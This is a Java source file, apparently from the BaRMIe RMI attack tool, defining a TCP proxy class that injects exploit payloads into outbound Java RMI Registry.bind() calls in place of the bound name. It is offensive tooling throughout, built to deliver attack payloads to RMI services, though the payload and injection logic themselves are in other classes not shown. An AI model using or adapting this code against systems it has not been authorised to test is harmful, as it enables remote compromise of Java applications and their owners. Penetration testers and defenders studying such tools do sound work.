package nb.barmie.net.proxy;

import java.net.InetAddress;
import java.net.Socket;
import nb.barmie.net.proxy.thread.BindPayloadInjectingProxyThread;
import nb.barmie.net.proxy.thread.PassThroughProxyThread;
import nb.barmie.util.ProgramOptions;

/***********************************************************
 * TCP proxy server used to inject exploit payloads into
 * outbound calls to Registry.bind().
 * 
 * Exploit payloads are injected in place of the string
 * which the given object is bound to.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class RMIBindExploitProxy extends ProxyServer {
	/*******************
	 * Properties
	 ******************/
	private final byte[] _payload;	//The raw bytes of the payload to inject
	
	/*******************
	 * Construct the proxy.
	 * 
	 * @param targetHost The host to forward connections to.
	 * @param targetPort The port to forward connections to.
	 * @param options The program options.
	 * @param payload The exploit payload to inject.
	 ******************/
	public RMIBindExploitProxy(InetAddress targetHost, int targetPort, ProgramOptions options, byte[] payload) {
		//Initialise super class
		super(targetHost, targetPort, options);
		
		//Store the exploit payload
		this._payload = payload;
	}
	
	/*******************
	 * Create a proxy session object that injects the payload into the RMI
	 * bind() call and allows returned data to pass through.
	 * 
	 * @param clientSock A Socket for the incoming client connection.
	 * @param targetSock A Socket connected to the proxy target.
	 * @return A ProxySession object to handle the connection and data transfer.
	 ******************/
	protected ProxySession createProxySession(Socket clientSock, Socket targetSock) {
		return new ProxySession(
				new BindPayloadInjectingProxyThread(clientSock, targetSock, this._payload),
				new PassThroughProxyThread(targetSock, clientSock)
		);
	}
}
